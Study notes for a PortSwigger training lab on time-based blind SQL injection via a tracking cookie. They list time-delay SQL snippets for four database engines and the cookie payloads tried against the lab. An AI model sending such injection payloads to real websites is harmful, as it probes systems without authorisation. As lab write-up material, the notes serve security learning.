# Lab #13 - Blind SQL Injection with time delays
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

Vulnerable parameter - tracking cookie

**End Goal:**
- to prove that the field is vulnerable to blind SQLi (time based)

**Analysis:**

***Conditional time delays***
You can test a single boolean condition and trigger a time delay if the condition is true.

Oracle 	```SQL SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual```

Microsoft 	```SQL IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'```

PostgreSQL 	```SQL SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END```

MySQL 	```SQL SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')``` 

*Note for Burp: **ctrl + u** to convert code*

select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';

```SQL
' || (SELECT sleep(10))-- 
```
-> maybe is not the correct Database

```SQL
' || (SELECT pg_sleep(10))-- 
```


